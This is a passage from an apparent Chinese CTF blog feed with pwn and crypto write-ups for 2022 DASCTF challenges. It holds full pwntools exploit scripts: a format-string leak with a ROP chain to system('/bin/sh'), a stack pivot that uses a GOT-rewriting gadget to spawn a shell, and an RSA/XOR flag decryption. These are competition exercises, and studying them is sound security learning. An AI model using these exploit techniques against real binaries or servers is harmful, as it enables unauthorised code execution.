class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序漏洞明显，格式化字符串和<code>gets</code>栈溢出，各有<code>1/2</code>的机会。</p><p>不过格式化字符串里也可以栈溢出，长度为<code>0x78</code>，所以只需要运行<code>fmt()</code>，使用<code>%s</code>泄露<code>puts</code>地址，获取libc，构造<code>rop</code>再次执行<code>fmt()</code>，使用<code>pop_rdi</code>传参执行<code>system(&#39;/bin/sh&#39;)</code>或者直接使用<code>one_gadgets</code>。但是程序的<code>pop_rdi</code>地址存在<code>0a</code>，会造成截断，所以得下载<code>libc</code>，在<code>libc</code>里找的<code>pop_rdi</code>地址。</p><p><code>libc</code>版本查询和下载：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>   </p><p>或者使用<code>glibc-all-in-one</code>：<a href="https://www.yuque.com/cyberangel/rg9gdm/vk7hfg#20Itu">https://www.yuque.com/cyberangel/rg9gdm/vk7hfg#20Itu</a></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./luck&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;luck&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a) )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name, get_addr_name, mode=<span class="number">1</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line"><span class="keyword">return</span> addr-libc.sym[name]+libc.sym[get_addr_name]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> addr-libc.dump(name)+libc.dump(get_addr_name)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">game = <span class="number">0x00000000004008A0</span></span><br><span class="line">over = <span class="number">0x0000000000400876</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004008d3</span></span><br><span class="line">fmt = <span class="number">0x0000000000400836</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400581</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rand_got = elf.got[<span class="string">&#x27;rand&#x27;</span>]</span><br><span class="line"><span class="comment"># print(hex(rand_got))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pa</span>():</span></span><br><span class="line">ru(<span class="string">&#x27;good luck\n&#x27;</span>)</span><br><span class="line">s = ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fmt</span>():</span></span><br><span class="line">payload = <span class="string">&#x27;aaaa%7$s&#x27;</span> + p64(puts_got) + (<span class="number">0x78</span> - <span class="number">16</span>) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += p64(fmt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">puts = l64()</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;, puts)</span></span><br><span class="line"><span class="comment"># libc_base = puts - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000021112</span> + libc_base</span><br><span class="line">lg(<span class="string">&#x27;pop_rdi_ret&#x27;</span>, pop_rdi_ret)</span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>) </span><br><span class="line"><span class="comment"># payload += p64(0xf03a4 + libc_base)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(<span class="number">0xdeafdeaf</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = pa()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;fmt&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">Fmt()<span class="comment"># b *0x000000000040076A</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h1><p>给了<code>libc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">storge$</span><span class="bash"> ./libc.so</span></span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br><span class="line">Usage: ./libc.so [options] [--] pathname [args]</span><br></pre></td></tr></table></figure><p><code>musl libc (x86_64)</code>是轻量型的，堆管理方式和<code>glibc</code>不一样。</p><p>参考：<a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a></p><p>程序漏洞明显，可以任意地址写和地址泄露，不过堆管理结构还没摸清楚，</p><p>先鸽了。。。。</p><h1 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h1><p>没什么好说的，爆破<code>key</code> , <code>0&lt;= key &lt;= 10</code> , <code>cmd5</code>查<code>e</code>，<code>RSA</code>解密即可</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = &#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="comment"># key = random.randint(1,10)</span></span><br><span class="line"><span class="comment"># for i in range(len(flag)):</span></span><br><span class="line"><span class="comment"># crypto += chr(ord(flag[i])^key)</span></span><br><span class="line"><span class="comment"># m = crypto的ascii十六进制</span></span><br><span class="line"><span class="comment"># e = random.randint(1,100)</span></span><br><span class="line"><span class="comment"># print(hashlib.md5(e))</span></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = <span class="number">65267138038038699886916162739434586079731613825212388229424706115289974540917</span></span><br><span class="line">n = p*q</span><br><span class="line">e= <span class="number">23</span></span><br><span class="line"><span class="comment"># c = pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment">#37693cfc748049e45d87b8c7d8b9aacd ---&gt; 23</span></span><br><span class="line"><span class="comment">#4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line">c=<span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for i in range(1,100):</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m1 = long_to_bytes(m1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> m1:</span><br><span class="line">flag += <span class="built_in">chr</span>(j ^ i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;W31coM3_C0m3_7o_f4T3ctf&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2022DASCTF Apr X FATE 防疫挑战赛</summary>
    
    
    
    <category term="CTF" scheme="https://adam-01.github.io/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://adam-01.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2022DASCTF X SU 三月春季挑战赛-pwn</title>
    <link href="https://adam-01.github.io/2022/04/17/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-PWN/"/>
    <id>https://adam-01.github.io/2022/04/17/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-PWN/</id>
    <published>2022-04-17T08:57:06.000Z</published>
    <updated>2022-04-17T10:20:21.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>只开启了<code>Partial RELRO</code>和<code>NX</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">tmp$</span><span class="bash"> checksec checkin</span></span><br><span class="line">[*] &#x27;/home/pwn/\xe6\xa1\x8c\xe9\x9d\xa2/tmp/checkin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序逻辑简单，一个栈溢出，不过只能溢出到<code>rbp</code>和<code>ret</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">160</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xB0</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是<code>read</code>的<code>buf</code>参数是通过<code>lea  rax, [rbp+buf]</code>得到。所以只需要控制<code>rbp</code>就能够实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401156</span> ; <span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function">.text:0000000000401156                 <span class="keyword">public</span> main</span></span><br><span class="line"><span class="function">.text:0000000000401156 main            proc near               </span>; DATA XREF: _start+<span class="number">21</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401156</span></span><br><span class="line">.text:<span class="number">0000000000401156</span> buf             = byte ptr <span class="number">-0</span>A0h</span><br><span class="line">.text:<span class="number">0000000000401156</span></span><br><span class="line">.text:<span class="number">0000000000401156</span> ; __unwind &#123;</span><br><span class="line"> ·········</span><br><span class="line"> ·······</span><br><span class="line"> ······</span><br><span class="line"> ·····</span><br><span class="line"> ····</span><br><span class="line">.text:<span class="number">00000000004011B</span>F                 lea     rax, [rbp+buf]   &lt;==== 这里使用rbp条用参数。</span><br><span class="line">.text:<span class="number">00000000004011</span>C6                 mov     edx, <span class="number">0B</span>0h       ; nbytes</span><br><span class="line">.text:<span class="number">00000000004011</span>CB                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">00000000004011</span>CE                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">.text:<span class="number">00000000004011</span>D3                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004011</span>D8                 call    _read</span><br><span class="line">.text:<span class="number">00000000004011</span>DD                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004011E2</span>                 leave</span><br><span class="line">.text:<span class="number">00000000004011E3</span>                 retn</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>栈迁移到<code>bss</code>段</li><li>泄露<code>libc</code>地址，首先改写<code>setvbuf</code>为<code>puts</code>, 这里改写可以使用<code>x64</code>中<code>__do_global_dtors_aux</code>存在一个<code>magic gadget</code>: <code>add  [rbp-3Dh], ebx;nop;ret;</code>；  在调用<code>setvbuf</code>,其参数设置为<code>read_got</code>，就可以执行<code>puts(read_addr)</code>, 从而得到<code>system</code>和<code>/binsh</code>。</li><li>返回到<code>read</code>处,执行<code>system(&#39;/bin/sh&#39;)</code></li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./checkin&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28957</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name, get_addr_name, mode=<span class="number">1</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line"><span class="keyword">return</span> addr-libc.sym[name]+libc.sym[get_addr_name]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> addr-libc.dump(name)+libc.dump(get_addr_name)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># __do_global_dtors_aux: magic gadget:add [rbp-0x3d], rbx; ret;</span></span><br><span class="line">magic_addr = <span class="number">0x000000000040113C</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401253</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040113d</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004011e2</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x000000000040124A</span></span><br><span class="line"></span><br><span class="line">bss = elf.bss()+<span class="number">0x800</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>+p64(bss+<span class="number">0xa0</span>)+p64(<span class="number">0x04011BF</span>)</span><br><span class="line">se(payload)</span><br><span class="line">puts_sym = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setvbuf_sym = libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt = elf.plt[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;puts_sym&#x27;</span>, puts_sym)</span><br><span class="line">lg(<span class="string">&#x27;setvbuf_sym&#x27;</span>, setvbuf_sym)</span><br><span class="line"><span class="comment"># offset = puts_sym - setvbuf_sym</span></span><br><span class="line"><span class="comment"># if offset &lt;0:</span></span><br><span class="line"><span class="comment"># offset = 0-offset + 0x100000000 </span></span><br><span class="line">offset = (puts_sym - setvbuf_sym) <span class="keyword">if</span> puts_sym &gt; setvbuf_sym <span class="keyword">else</span> (<span class="number">0x100000000</span> + puts_sym - setvbuf_sym)</span><br><span class="line">lg(<span class="string">&#x27;offset&#x27;</span>,offset)</span><br><span class="line"><span class="comment"># use magic gadget to write setvbuf ==&gt; puts</span></span><br><span class="line">payload = p64(pop_rbx_rbp_r12_r13_r14_r15)</span><br><span class="line">payload += p64(offset)</span><br><span class="line">payload += p64(setvbuf_got+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_addr) <span class="comment"># add [rbp-0x3d], rbx; ret;</span></span><br><span class="line">payload += p64(ret)*<span class="number">0</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(setvbuf_plt)</span><br><span class="line">payload += p64(pop_rbp)</span><br><span class="line">payload += p64(bss+<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(<span class="number">0x04011BF</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss-<span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line">read = l64()</span><br><span class="line"></span><br><span class="line">libc_base = read - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">lg(<span class="string">&#x27;read&#x27;</span>,read)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh)</span></span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="wedding"><a href="#wedding" class="headerlink" title="wedding"></a>wedding</h1><p>赛后复现</p><p>保护全开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 